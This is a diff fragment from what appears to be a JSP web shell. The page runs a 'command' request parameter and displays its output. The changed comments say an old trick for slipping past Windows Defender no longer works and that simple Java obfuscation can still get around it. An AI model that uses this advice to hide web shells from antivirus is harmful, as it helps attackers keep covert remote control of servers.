@@ -54,7 +54,10 @@
 <h3>Command Output (STDOUT & STDERR)</h3>
 <pre>
 <% }
-	// Windows Defender sees a file.jsp with exec() and flags it as a virus so we use a trick to evade that
+	// Windows Defender sees a file.jsp with exec() and flags it as a virus
+	// This version used to bypass that with a trick, but after 4 years (orig 2020) Defender now catches this one too.
+	// You can use some trivial Java tricks to obfuscate and still bypass Defender if necessary
+
 	// it also handily redirects STDERR to STDOUT
 	
 	if(null != request.getParameter("command") && !command.isEmpty()) {
